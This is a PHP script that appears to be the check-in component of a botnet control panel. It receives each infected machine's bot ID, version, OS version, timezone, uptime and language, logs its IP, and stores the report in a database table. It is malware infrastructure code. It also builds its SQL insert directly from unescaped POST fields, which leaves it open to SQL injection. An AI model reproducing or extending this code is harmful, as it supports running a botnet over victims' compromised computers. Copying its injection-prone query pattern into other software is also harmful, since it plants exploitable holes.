<?

$bot_guid = $_POST['bot_guid'];
if (!isset($bot_guid))
	exit;

include 'mod_dbasep.php';
include 'mod_time.php';

function getip(&$ip, &$inip) {
	$ip = $inip = $_SERVER ["REMOTE_ADDR"];
	if (isset ($_SERVER ["HTTP_X_FORWARDED_FOR"])) {
		if (isset ($_SERVER ["HTTP_X_REAL_IP"]))
			$inip = $_SERVER ["HTTP_X_REAL_IP"];
		else
			$inip = $_SERVER ["HTTP_X_FORWARDED_FOR"];
	}
}

// --

$bot_version = intval($_POST['bot_version']);

$tstamp = GetTimeStamp($_POST['local_time']);
$local_time = gmdate('Y.m.d H:i:s', $tstamp);

$timezone = $_POST['timezone'];

list($hour, $minute, $second) = split('[:]', $_POST['tick_time']);
$tstamp = $hour * 60 * 60 + $minute * 60 + $second;
$tick_time = gmdate('Y.m.d H:i:s', $tstamp);

$os_version = $_POST['os_version'];
$language_id = intval($_POST['language_id']);

// ---

$dbconn = db_open();

getip($ip, $inip);
$date_rep = gmdate('Y.m.d H:i:s');

$sql = "INSERT DELAYED INTO rep1 VALUES (NULL, '$inip', '$bot_guid', $bot_version, '$local_time', '$timezone', '$tick_time', '$os_version', $language_id, '$date_rep')";
mysql_query($sql);
if (mysql_affected_rows() != 1) {
	include 'mod_file.php';
	//writelog("error.log", "Wrong query : \" $sql \"");
	writefile("failed.sql", "$sql;");
	db_close($dbconn);
	exit;
}

db_close($dbconn);

exit;

?>